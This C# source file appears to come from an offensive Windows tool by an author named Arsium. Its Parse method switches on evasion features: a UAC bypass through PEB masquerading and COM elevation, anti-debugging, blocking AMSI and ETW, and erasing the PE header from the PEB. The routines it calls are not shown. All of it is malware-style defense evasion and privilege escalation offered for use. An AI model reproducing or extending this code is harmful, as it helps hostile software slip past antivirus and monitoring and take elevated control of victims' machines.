using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Special
{
    public static class Parser
    {
        public enum HRESULT : long
        {
            S_FALSE = 0x0001,
            S_OK = 0x0000,
            E_INVALIDARG = 0x80070057,
            E_OUTOFMEMORY = 0x8007000E
        }

        public static void Parse(bool amsiBlock = false, bool etwBlock = false, bool erasePEFromPEB = false, bool antiDBG = false, bool bypassUAC = false) 
        {
            DelegatesHandling.PrepareDelegate();
            if (bypassUAC) 
            {
                PEB.MasqueradePEB();
                COM.Start(Application.ExecutablePath);
            }

            if (antiDBG && AntiDBG.isThreadLaunched == false)
                AntiDBG.BlockIt();

            if (amsiBlock)
                AMSI.BlockIt();

            if (etwBlock)
                ETW.BlockIt();

            if (erasePEFromPEB)
                PEFromPEB.BlockIt();
        }
    }
}
